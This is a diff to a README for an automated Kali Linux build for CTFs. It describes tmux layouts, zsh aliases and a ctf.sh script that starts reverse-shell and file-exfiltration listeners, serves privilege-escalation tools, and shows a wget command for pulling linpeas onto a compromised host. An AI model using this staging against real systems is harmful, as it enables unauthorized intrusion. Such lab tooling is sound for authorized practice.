@@ -1,9 +1,9 @@
 # Kali - DevOps - Build
 Building your standard Kali environment using Ansible
 
-# Introduction
+## Introduction
 
-## Summary
+### Summary
 
 The purpose of this guide is to share with you my automated Kali build. Anyone who has used Kali for some time has no doubt broken it multiple times and been faced with the prospect of having to rebuild a machine that you have spent countless hours perfecting. Many people utilise Virtual Machines and snapshots to be able to have a **known good** build that they can simply clone. I have also used this approach in the past however updating to the latest build can become arduous and can occasionally break things.  So to simplify the process you can use automation then if you add packages / repositories / download files later it's relatively straight forward to add these items into an Ansible template especially when you have some examples to work from. 
 
@@ -23,7 +23,7 @@ So why would you want to go to this trouble? Well apart from automating the inst
   * Installs the following plugins - tpm, tmux-sensible, Dracula theme, tmux-resurrect, tmux-continuum.
   * Updated Status bar which shows the VPN IP Address, CPU %, Used memory, Extended date and time, current location and temperature. 
 
-**Custom Scripts**
+### **Custom Scripts & Configurations**
 
 * **ctf.sh** - Included is a custom script I wrote specifically for playing CTFs. It starts Tmux, then configures a basic layout including separate tabs for Enumeration, Exploits, Metasploit, Shells & Services. This script also sets the variables `$ip` (The remote host) & `$lhost` (The tun0 or ppp0 ip address) .
   * **Enumeration** - nmap / gobuster / autorecon scans.
@@ -32,6 +32,13 @@ So why would you want to go to this trouble? Well apart from automating the inst
   * **Shells** - The shells tab runs a netcat listener on ports 53 & 443, so this is already running and waiting for shells. It also runs a listener on port 235 which will automatically write to a file, useful if you need to exfiltrate a file. 
   * **Services** - The services tab runs a web server on port 80 in the /home/kali/share folder. If you keep all of your privesc scripts and files in this location then you simply run `wget 10.10.1.1\linpeas.sh` from a compromised host to download `linpeas.sh` for instance. The services tab also runs an SMB server in the same /home/kali/share directory because hey it's good to have options. 
 * **ipaddress.sh** - My quick and dirty script to find the local tun0 or ppp0 ip address, this gets passed to the `ctf.sh` script where it is set as the `$lhost` variable in all panes and is passed into metasploit as a global variable. 
+* **.zshrc** (ZSH configuration file)
+  * Aliases  (Because typing long commands repeatedly sucks let the robot do it)
+    * **cb** (e.g. `cb $ip` copies the remote IP address to the clipboard, can also be used via the `|` character. Taken from https://madebynathan.com/2011/10/04/a-nicer-way-to-use-xclip/)
+    * **cbf** (e.g. `cbf /etc/passwd` would copy the `/etc/passwd` file to the clipboard.)
+    * **cbssh** (copies `~/.ssh/id_rsa.pub` to the clipboard)
+    * **cbhs** (copies the most recent command in the history file)
+    * **rs** (e.g. `rs $ip` Uses the containerised version of Rustscan to very quickly scan an IP address. This is usually the first command I run)
 
 ## Pre-requisites
 
@@ -47,8 +54,41 @@ A base installation of Kali Linux. For this guide I downloaded the latest virtua
 4. Select Finish
 5. Modify the VM settings as required (adjust CPU & Memory to suit hardware). 
 6. Right click on the newly imported virtual machine and select `Power` -> `Start Up Guest`
+7. Once the machine has booted. Open a terminal and update packages. `sudo apt update; sudo apt upgrade -y`.
 
 ## Installation
 
 1. Git 
+
+
+
+## Customisation
+
+OK so you have a automated Kali build but it's not exactly what you want here is how you can update / improve it to suit your workflow better. 
+
+### Installing Packages
+
+All packages are install by the setup.yaml Ansible file. 
+
+## References
+
+A big thanks to the following people who I stole from for taking the time to document and share their hard work. 
+
+**André Brandão** - https://andrebrandao.me/articles/terminal-setup-with-zsh-tmux-dracula-theme/
+
+**Cassidy Scheffer** - https://cassidy.codes/blog/2019-08-03-tmux-colour-theme/
+
+**Ham Vocke** - https://www.hamvocke.com/blog/a-guide-to-customizing-your-tmux-conf/
+
+**Nathan Broadbent** - https://madebynathan.com/2011/10/04/a-nicer-way-to-use-xclip/
+
+And the following projects for being awesome. 
+
+http://guake-project.org/index.html
+
+https://github.com/romkatv/powerlevel10k
+
+https://github.com/tmux/tmux
+
+
 
